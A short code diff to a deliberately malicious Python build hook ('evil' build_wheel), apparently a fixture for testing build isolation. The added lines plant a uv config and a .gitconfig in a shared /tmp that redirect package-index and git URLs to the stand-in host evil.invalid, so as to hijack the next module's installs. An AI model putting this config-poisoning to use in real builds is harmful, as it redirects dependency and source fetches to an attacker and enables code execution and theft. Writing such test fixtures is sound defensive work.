@@ -25,6 +25,10 @@ def build_wheel(*args, **kwargs):
            for s in ("site_a", "site_b")},
         "pkgs": attempt(lambda: os.mkdir(f"{M}/pkgs/md-evil_99")),
     }
+    # The unit's /tmp is every module's: config there for the next module's uv and git (check.py installs one after)
+    Path("/tmp/.config/uv").mkdir(parents=True, exist_ok=True)
+    Path("/tmp/.config/uv/uv.toml").write_text('index-url = "http://evil.invalid/simple"\n')
+    Path("/tmp/.gitconfig").write_text('[url "https://evil.invalid/"]\n\tinsteadOf = https://\n')
     print("EVIL " + json.dumps(seen), file=sys.stderr)
     raise RuntimeError("the evil build ends here")
 
